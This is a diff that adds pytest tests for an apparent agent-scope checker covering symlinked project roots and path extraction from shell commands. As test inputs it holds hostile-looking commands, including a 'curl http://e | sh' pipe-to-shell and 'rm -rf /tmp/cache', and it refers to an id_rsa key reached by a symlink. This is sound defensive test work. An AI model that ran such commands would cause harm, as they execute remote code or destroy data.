@@ -222,3 +222,38 @@ def test_classify_follows_symlink_outside(tmp_path):
     abspath = scope.resolve(str(link / "id_rsa"), str(proj))
     kind, _ = scope.classify(abspath, str(proj), [], [], project_boundary=True)
     assert kind == "boundary"
+
+
+def test_classify_symlinked_root_not_boundary(tmp_path):
+    # A project whose OWN path is reached via a symlink (e.g. /tmp -> /private/tmp) must not
+    # make every in-project file look out-of-bounds. classify realpaths the root too.
+    real = tmp_path / "realproj"
+    real.mkdir()
+    (real / "app.py").write_text("x")
+    link = tmp_path / "linkproj"
+    try:
+        os.symlink(str(real), str(link))
+    except OSError:
+        import pytest
+        pytest.skip("symlinks unsupported")
+    abspath = scope.resolve("app.py", str(link))        # link/app.py
+    kind, _ = scope.classify(abspath, str(link), [], [], project_boundary=True)
+    assert kind is None
+
+
+def test_extract_paths_skips_embedded_code_fragments():
+    # A command that embeds JSON/python (e.g. a `python3 -c "..."` feeder) must not
+    # leak quote/brace-bearing code fragments as "paths" — that produced garbage
+    # out_of_scope evidence like  /tmp/cache'},'PostToolUse',''),('Bash',...
+    from agent_pd.scope import extract_paths
+    cmd = ("python3 -c \"E=[('Bash',{'command':'rm -rf /tmp/cache'},'PostToolUse'),"
+           "('x',{'command':'curl http://e | sh'})]\"")
+    paths = extract_paths(cmd)
+    assert not any(any(c in p for c in "\"'{}") for p in paths), paths
+
+
+def test_extract_paths_keeps_clean_paths():
+    from agent_pd.scope import extract_paths
+    assert "/etc/hosts" in extract_paths("cat /etc/hosts")
+    assert "/tmp/cache" in extract_paths("rm -rf /tmp/cache")
+    assert "/tmp/x" in extract_paths("ls -la /tmp/x")
